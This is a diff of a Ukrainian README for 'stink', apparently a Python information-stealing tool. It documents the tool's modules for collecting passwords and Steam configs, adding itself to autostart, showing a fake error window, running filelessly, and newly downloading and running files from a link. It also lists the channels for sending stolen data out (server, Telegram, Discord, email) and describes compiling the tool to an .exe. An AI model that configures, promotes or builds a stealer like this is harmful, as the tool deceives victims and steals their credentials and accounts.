@@ -58,6 +58,7 @@
 7. Можливість додання в автозапуск.
 8. Вивід вікна з фейковою помилкою.
 9. Виконання без створення будь яких файлів.
+10. Підвантаження і запуск файлів за посиланням.
 
 ## Приклад використання
 ### Стандартний
@@ -86,7 +87,7 @@ if __name__ == '__main__':
 ```
 ### Додаткові параметри
 
-- `features` - вмикає модулі зі списку. Модулі можна імпортувати з `stink.enums.Features`. Доступні модулі:
+- `features` - список модулів з `stink.Features`:
 
   - `passwords` - збір паролів.
 
@@ -117,22 +118,27 @@ if __name__ == '__main__':
   - `steam` - збір конфігів Steam.
 
 
-- `utils` - вмикає утиліти зі списку. Утиліти можна імпортувати з `stink.enums.Utils`. Доступні утиліти:
+- `utils` - список утиліт з `stink.Utils`:
 
   - `autostart` - додання в автозапуск.
 
-  - `message` - вивід фейкового вікна помилки.
+  - `message` - вивід фейкового [вікна помилки](https://github.com/FallenAstaroth/stink/wiki/Fake-error).
   
 
-- `senders` - запускає способи надсилання зі списку. Способи надсилання можна імпортувати з `stink.enums.Senders`. Доступні способи надсилання:
+- `senders` - список способів надсилання з `stink.Senders`:
 
-  - `server` - відправка на сервер.
+  - `server` - відправка на [сервер](https://github.com/FallenAstaroth/stink/wiki/Server).
 
-  - `telegram` - відправка в Telegram.
+  - `telegram` - відправка в [Telegram](https://github.com/FallenAstaroth/stink/wiki/Telegram-bot).
 
-  - `discord` - відправка в Discord.
+  - `discord` - відправка в [Discord](https://github.com/FallenAstaroth/stink/wiki/Discord-hook).
 
-  - `smtp` - відправка на пошту.
+  - `smtp` - відправка на [пошту](https://github.com/FallenAstaroth/stink/wiki/Smtp).
+
+
+- `loaders` - підвантажувачі файлів з `stink`:
+
+  - `Loader` - універсальний [підвантажувач](https://github.com/FallenAstaroth/stink/wiki/Files-loader).
 
 ## Створення exe
 Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C, а потім скомпілюємо в .exe файл.
